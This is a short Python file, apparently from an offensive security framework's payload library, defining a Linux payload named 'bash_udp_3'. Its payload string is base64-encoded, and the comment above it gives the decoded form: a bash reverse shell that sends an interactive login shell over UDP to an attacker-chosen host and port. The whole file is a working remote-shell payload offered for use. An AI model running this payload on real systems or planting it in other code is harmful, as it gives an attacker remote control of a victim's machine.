from lib.framework.core.payload import Payload


# bash -l > /dev/udp/{LHOST}/{LPORT} 0<&1 2>&1
class bash_udp_3(Payload):
    name = "bash_udp_3"
    platform = ["linux"]
    payload = "YmFzaCAtbCA+IC9kZXYvdWRwL3tMSE9TVH0ve0xQT1JUfSAwPCYxIDI+JjE="
